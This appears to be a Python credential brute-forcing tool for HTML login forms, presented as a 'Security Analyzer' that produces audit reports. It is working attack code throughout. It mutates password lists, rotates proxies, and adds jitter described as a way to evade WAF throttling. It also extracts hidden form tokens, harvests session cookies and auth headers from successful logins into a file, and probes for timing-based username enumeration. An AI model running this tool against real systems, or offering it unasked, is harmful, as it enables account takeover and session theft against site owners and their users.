import requests
from requests.auth import HTTPBasicAuth, HTTPDigestAuth
import urllib3
import os
import argparse
import json
import re
import threading
import itertools
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from collections import Counter, defaultdict

# Suppress insecure request warnings if testing self-signed certs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ProxyPool:
    """Thread-safe round-robin proxy pool manager."""
    def __init__(self, filepath=None):
        self.proxies = []
        if filepath and os.path.exists(filepath):
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                self.proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        self.lock = threading.Lock()
        self.cycle = itertools.cycle(self.proxies) if self.proxies else None

    def get_proxy_dict(self):
        if not self.cycle:
            return None
        with self.lock:
            p = next(self.cycle)
            return {"http": p, "https": p}

def load_wordlist(filepath):
    """Loads lines from a file into a list, ignoring empty lines and comments."""
    if not filepath or not os.path.exists(filepath):
        return []
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f if line.strip() and not line.startswith('#')]

def mutate_passwords(passwords):
    """Intelligent mutation engine to expand a seed password list."""
    mutated = set()
    suffixes = ["", "123", "1234", "12345", "2025", "2026", "!", "123!", "@", "#"]
    
    for pwd in passwords:
        mutated.add(pwd)
        mutated.add(pwd.capitalize())
        mutated.add(pwd.upper())
        
        leet = pwd.replace('a', '@').replace('e', '3').replace('i', '1').replace('o', '0').replace('s', '$')
        mutated.add(leet)
        mutated.add(leet.capitalize())
        
        for suffix in suffixes:
            if suffix:
                mutated.add(f"{pwd}{suffix}")
                mutated.add(f"{pwd.capitalize()}{suffix}")
                mutated.add(f"{leet}{suffix}")
                
    return list(mutated)

def apply_jitter(delay):
    """Applies a random jitter delay to mimic human behavior and evade WAF throttling."""
    if delay > 0:
        actual_delay = delay + random.uniform(0, delay * 0.5)
        time.sleep(actual_delay)

def check_lockout(resp_text, status_code, lockout_keyword):
    """Checks if a response indicates account lockout or rate limiting."""
    if status_code == 429:
        return True
    if lockout_keyword and lockout_keyword.lower() in resp_text.lower():
        return True
    return False

def get_request_proxies(proxy_pool, single_proxy):
    """Determines proxies to use for a specific request."""
    if proxy_pool and proxy_pool.proxies:
        return proxy_pool.get_proxy_dict()
    elif single_proxy:
        return {"http": single_proxy, "https": single_proxy}
    return None

def parse_custom_headers(header_args):
    """Parses custom header strings into a dictionary."""
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    if header_args:
        for h in header_args:
            if ":" in h:
                key, val = h.split(":", 1)
                headers[key.strip()] = val.strip()
    return headers

def parse_cookies(cookie_arg):
    """Parses a cookie string into a dictionary."""
    cookies = {}
    if cookie_arg:
        for item in cookie_arg.split(";"):
            if "=" in item:
                k, v = item.split("=", 1)
                cookies[k.strip()] = v.strip()
    return cookies

def test_form_auth(session, target_url, username, password, user_field, pass_field, failure_keyword, success_regex, proxy_pool, single_proxy, base_headers, cookies, delay=0, lockout_keyword=None, verbose=False):
    """Tests HTML Form-Based Authentication with session harvesting and response size metrics."""
    headers = base_headers.copy()
    if "Content-Type" not in headers:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        
    req_proxies = get_request_proxies(proxy_pool, single_proxy)

    apply_jitter(delay)
    try:
        get_resp = session.get(target_url, headers=headers, cookies=cookies, proxies=req_proxies, timeout=5, allow_redirects=True, verify=False)
        
        hidden_inputs = {}
        if get_resp.status_code == 200:
            matches = re.findall(r'<input[^>]+type=["\']?hidden["\']?[^>]*>', get_resp.text, re.IGNORECASE)
            for m in matches:
                name_match = re.search(r'name=["\']?([^"\']+)["\']?', m, re.IGNORECASE)
                val_match = re.search(r'value=["\']?([^"\']*)["\']?', m, re.IGNORECASE)
                if name_match:
                    name = name_match.group(1)
                    val = val_match.group(1) if val_match else ""
                    hidden_inputs[name] = val

        payload = {
            user_field: username,
            pass_field: password,
            **hidden_inputs
        }

        apply_jitter(delay)
        
        start_time = time.time()
        resp = session.post(
            target_url,
            data=payload,
            headers=headers,
            cookies=cookies,
            proxies=req_proxies,
            timeout=5,
            allow_redirects=True,
            verify=False
        )
        elapsed = time.time() - start_time
        resp_length = len(resp.content)

        if check_lockout(resp.text, resp.status_code, lockout_keyword):
            print(f"[!] [LOCKOUT/WAF WARNING] Account lockout or rate-limit triggered for user '{username}' at {target_url} (Status: {resp.status_code})")

        is_success = False
        if resp.status_code in [200, 302, 303]:
            body_text = resp.text
            if success_regex:
                if re.search(success_regex, body_text):
                    is_success = True
            elif failure_keyword and failure_keyword.lower() not in body_text.lower():
                is_success = True
            elif not failure_keyword and resp.status_code == 302:
                is_success = True

        # Harvest cookies and headers from response session state
        captured_cookies = {c.name: c.value for c in resp.cookies}
        captured_headers = {k: v for k, v in resp.headers.items() if 'auth' in k.lower() or 'token' in k.lower() or 'set-cookie' in k.lower()}

        result = {
            "username": username,
            "password": password,
            "endpoint": target_url,
            "type": "form",
            "status_code": resp.status_code,
            "response_time": elapsed,
            "response_length": resp_length,
            "success": is_success,
            "session_cookies": captured_cookies,
            "session_headers": captured_headers
        }

        if is_success:
            print(f"\n[+] [SUCCESS] Valid login found -> {username}:{password} at {target_url}")
            if captured_cookies:
                print(f"    [+] Harvested Cookies: {captured_cookies}")
            if captured_headers:
                print(f"    [+] Harvested Auth Headers: {captured_headers}\n")
        elif verbose:
            print(f"[-] Failed form login {username}:{password} at {target_url} (Status: {resp.status_code}, Length: {resp_length}B)")

        return result

    except requests.exceptions.RequestException as e:
        if verbose:
            print(f"[!] Request exception for {target_url}: {e}")
        pass

    return None

def analyze_timing_leak(all_results):
    """Analyzes response times per username to detect timing-based user enumeration vulnerabilities."""
    user_times = defaultdict(list)
    for res in all_results:
        if res and not res.get('success'):
            user_times[res['username']].append(res['response_time'])

    if len(user_times) < 2:
        return []

    averages = {user: sum(times)/len(times) for user, times in user_times.items() if times}
    if not averages:
        return []

    overall_avg = sum(averages.values()) / len(averages)
    vulnerabilities = []

    print("\n" + "="*60 + "\n[*] Timing-Based User Enumeration Analysis:")
    for user, avg_time in averages.items():
        diff_pct = abs(avg_time - overall_avg) / overall_avg * 100 if overall_avg > 0 else 0
        print(f"    - User '{user}': Avg Response Time = {avg_time:.3f}s ({diff_pct:.1f}% deviation)")
        if diff_pct > 35 and avg_time > overall_avg:
            vulnerabilities.append({
                "username": user,
                "avg_time": avg_time,
                "deviation": diff_pct
            })

    if vulnerabilities:
        print("\n[!] [POTENTIAL VULNERABILITY] Significant timing variance detected!")
    else:
        print("    [+] No significant timing anomalies detected across usernames.")
    print("="*60)
    return vulnerabilities

def analyze_length_outliers(all_results):
    """Clusters response lengths to detect structural outliers or hidden states."""
    lengths = [res['response_length'] for res in all_results if res and not res.get('success')]
    if not lengths:
        return []

    length_counts = Counter(lengths)
    baseline_length, baseline_count = length_counts.most_common(1)[0]
    
    outliers = []
    print("\n" + "="*60 + "\n[*] Response Length Clustering & Outlier Analysis:")
    print(f"    - Baseline Failure Length: {baseline_length} bytes ({baseline_count} occurrences)")

    for res in all_results:
        if res and not res.get('success'):
            l = res['response_length']
            if l != baseline_length:
                diff = abs(l - baseline_length)
                print(f"    [!] Outlier detected -> User: {res['username']}, Password: {res['password']} | Length: {l}B (Diff: {diff:+d}B)")
                outliers.append({
                    "username": res['username'],
                    "password": res['password'],
                    "length": l,
                    "baseline_diff": diff,
                    "status_code": res['status_code']
                })

    if not outliers:
        print("    [+] All failed responses conform to uniform length baseline.")
    print("="*60)
    return outliers

def export_html_report(findings, timing_vulns, length_outliers, report_path, metadata):
    """Generates a professional, styled HTML security report including session state details."""
    rows_html = ""
    for item in findings:
        cookies_str = str(item.get('session_cookies', {})).replace("{", "").replace("}", "")
        rows_html += f"""
        <tr>
            <td><code>{item['username']}</code></td>
            <td><code>{item['password']}</code></td>
            <td><a href="{item['endpoint']}" target="_blank">{item['endpoint']}</a></td>
            <td><code>{cookies_str if cookies_str else 'N/A'}</code></td>
            <td><code>{item['status_code']}</code></td>
        </tr>
        """

    if not rows_html:
        rows_html = '<tr><td colspan="5" class="no-findings">No valid credentials discovered during this scan.</td></tr>'

    timing_html = ""
    if timing_vulns:
        timing_rows = "".join([f"<tr><td><code>{v['username']}</code></td><td>{v['avg_time']:.3f}s</td><td style='color: #ef4444;'>+{v['deviation']:.1f}% slower</td></tr>" for v in timing_vulns])
        timing_html = f"""
        <h2 style="margin-top: 40px; color: #f59e0b;">⚠️ Potential User Enumeration (Timing Anomalies)</h2>
        <table>
            <thead>
                <tr>
                    <th>Username</th>
                    <th>Average Response Time</th>
                    <th>Anomaly Deviation</th>
                </tr>
            </thead>
            <tbody>
                {timing_rows}
            </tbody>
        </table>
        """

    outliers_html = ""
    if length_outliers:
        outlier_rows = "".join([f"<tr><td><code>{o['username']}</code></td><td><code>{o['password']}</code></td><td>{o['length']} bytes</td><td style='color: #38bdf8;'>{o['baseline_diff']:+d} bytes</td></tr>" for o in length_outliers])
        outliers_html = f"""
        <h2 style="margin-top: 40px; color: #38bdf8;">📊 Response Length Outliers & Anomalies</h2>
        <table>
            <thead>
                <tr>
                    <th>Username</th>
                    <th>Password Tested</th>
                    <th>Response Length</th>
                    <th>Baseline Difference</th>
                </tr>
            </thead>
            <tbody>
                {outlier_rows}
            </tbody>
        </table>
        """

    html_template = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Security Audit Report - Auth Analyzer</title>
    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --text-color: #f8fafc;
            --text-muted: #94a3b8;
            --accent-green: #22c55e;
            --accent-blue: #38bdf8;
            --border-color: #334155;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            margin: 0;
            padding: 40px;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
        }
        header {
            border-bottom: 2px solid var(--border-color);
            padding-bottom: 20px;
            margin-bottom: 30px;
        }
        h1 {
            margin: 0 0 10px 0;
            font-size: 24px;
            color: var(--accent-blue);
        }
        .meta-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            background: var(--card-bg);
            padding: 20px;
            border-radius: 8px;
            border: 1px solid var(--border-color);
            margin-bottom: 30px;
        }
        .meta-item span {
            display: block;
            font-size: 12px;
            color: var(--text-muted);
            text-transform: uppercase;
            margin-bottom: 4px;
        }
        .meta-item strong {
            font-size: 16px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            background: var(--card-bg);
            border-radius: 8px;
            overflow: hidden;
            border: 1px solid var(--border-color);
            margin-bottom: 20px;
        }
        th, td {
            padding: 14px 16px;
            text-align: left;
            border-bottom: 1px solid var(--border-color);
        }
        th {
            background-color: #111827;
            font-size: 13px;
            text-transform: uppercase;
            color: var(--text-muted);
        }
        tr:last-child td {
            border-bottom: none;
        }
        a {
            color: var(--accent-blue);
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        code {
            background: #0f172a;
            padding: 4px 8px;
            border-radius: 4px;
            font-family: monospace;
        }
        .no-findings {
            text-align: center;
            color: var(--text-muted);
            padding: 40px;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🔒 Security Audit & Authentication Report</h1>
            <p style="color: var(--text-muted); margin: 0;">Generated by <code>term_analyzer.py</code></p>
        </header>

        <div class="meta-grid">
            <div class="meta-item">
                <span>Target URL</span>
                <strong>__URL__</strong>
            </div>
            <div class="meta-item">
                <span>Auth Type</span>
                <strong>__AUTH_TYPE__</strong>
            </div>
            <div class="meta-item">
                <span>Scan Duration</span>
                <strong>__DURATION__</strong>
            </div>
            <div class="meta-item">
                <span>Valid Credentials Found</span>
                <strong style="color: var(--accent-green);">__TOTAL_FINDINGS__</strong>
            </div>
        </div>

        <h2>Discovered Credentials & Harvested Sessions</h2>
        <table>
            <thead>
                <tr>
                    <th>Username</th>
                    <th>Password</th>
                    <th>Endpoint</th>
                    <th>Harvested Session Cookies</th>
                    <th>Status</th>
                </tr>
            </thead>
            <tbody>
                __ROWS_HTML__
            </tbody>
        </table>

        __TIMING_HTML__
        __OUTLIERS_HTML__
    </div>
</body>
</html>
"""

    html_content = (
        html_template
        .replace("__URL__", metadata['url'])
        .replace("__AUTH_TYPE__", metadata['auth_type'].upper())
        .replace("__DURATION__", metadata['duration'])
        .replace("__TOTAL_FINDINGS__", str(len(findings)))
        .replace("__ROWS_HTML__", rows_html)
        .replace("__TIMING_HTML__", timing_html)
        .replace("__OUTLIERS_HTML__", outliers_html)
    )

    with open(report_path, 'w', encoding='utf-8') as f:
        f.write(html_content)
    print(f"[*] Professional HTML report successfully exported to {report_path}")

def run_analysis(args):
    usernames = load_wordlist(args.users)
    passwords = load_wordlist(args.passwords)
    
    if not usernames:
        usernames = ["admin", "root", "user"]
    if not passwords:
        passwords = ["password", "123456", "admin"]

    proxy_pool = ProxyPool(args.proxy_file) if args.proxy_file else None
    base_headers = parse_custom_headers(args.header)
    cookies = parse_cookies(args.cookie)

    session = requests.Session()

    print(f"[*] Loaded {len(usernames)} username(s) and {len(passwords)} password(s).")
    print(f"[*] Auth Type: {args.auth_type.upper()}")
    print(f"[*] Running with max {args.threads} concurrent threads...\n" + "-" * 60)

    tasks = [(user, pwd) for user in usernames for pwd in passwords]
    all_results = []
    valid_credentials = []

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [
            executor.submit(
                test_form_auth, session, args.url, user, pwd, 
                args.user_field, args.pass_field, args.failure_keyword, 
                args.success_regex, proxy_pool, args.proxy, base_headers, 
                cookies, args.delay, args.lockout_keyword, args.verbose
            )
            for user, pwd in tasks
        ]

        for future in as_completed(futures):
            res = future.result()
            if res:
                all_results.append(res)
                if res['success']:
                    valid_credentials.append({
                        "username": res['username'],
                        "password": res['password'],
                        "endpoint": res['endpoint'],
                        "type": res['type'],
                        "status_code": res['status_code'],
                        "session_cookies": res['session_cookies'],
                        "session_headers": res['session_headers']
                    })

    timing_vulns = []
    if args.timing_analysis:
        timing_vulns = analyze_timing_leak(all_results)

    length_outliers = []
    if args.detect_length_outliers:
        length_outliers = analyze_length_outliers(all_results)

    return valid_credentials, timing_vulns, length_outliers

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced Security Analyzer with Session Persistence")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--auth-type", choices=["form"], default="form", help="Authentication type to test")
    parser.add_argument("--users", default="usernames.txt", help="Path to usernames wordlist")
    parser.add_argument("--passwords", default="passwords.txt", help="Path to passwords wordlist")
    parser.add_argument("--user-field", default="username", help="Form field name for username")
    parser.add_argument("--pass-field", default="password", help="Form field name for password")
    parser.add_argument("--failure-keyword", default="invalid", help="Keyword in response indicating failure")
    parser.add_argument("--success-regex", help="Regular expression matching successful response body")
    parser.add_argument("--lockout-keyword", help="Keyword or phrase indicating lockout or rate limit")
    parser.add_argument("-H", "--header", action="append", help="Custom HTTP header")
    parser.add_argument("--cookie", help="Custom cookies string")
    parser.add_argument("--delay", type=float, default=0.0, help="Base delay in seconds")
    parser.add_argument("--timing-analysis", action="store_true", help="Enable side-channel timing analysis")
    parser.add_argument("--detect-length-outliers", action="store_true", help="Enable response length clustering")
    parser.add_argument("--save-session", default="sessions.json", help="File to save harvested session cookies and tokens")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of concurrent threads")
    parser.add_argument("--proxy", help="Route traffic through static proxy")
    parser.add_argument("--proxy-file", help="Path to proxy list file")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose debug output")
    parser.add_argument("-o", "--output", help="Save results to JSON file")
    parser.add_argument("--report", help="Generate professional HTML security report")

    args = parser.parse_args()

    print(f"[*] Starting Auth analysis on: {args.url}")
    start_time = datetime.now()
    
    found, timing_vulns, length_outliers = run_analysis(args)

    duration = datetime.now() - start_time
    duration_str = f"{duration.total_seconds():.2f}s"
    print(f"\n[+] Scan Complete in {duration_str}. Total valid items found: {len(found)}")

    if found:
        if args.output:
            with open(args.output, 'w', encoding='utf-8') as f:
                json.dump(found, f, indent=4)
            print(f"[*] Results successfully exported to JSON: {args.output}")

        if args.save_session:
            with open(args.save_session, 'w', encoding='utf-8') as f:
                json.dump([{ "username": item["username"], "cookies": item["session_cookies"], "headers": item["session_headers"] } for item in found], f, indent=4)
            print(f"[*] Harvested session state successfully saved to: {args.save_session}")

    if args.report:
        metadata = {
            "url": args.url,
            "auth_type": args.auth_type,
            "duration": duration_str
        }
        export_html_report(found, timing_vulns, length_outliers, args.report, metadata)
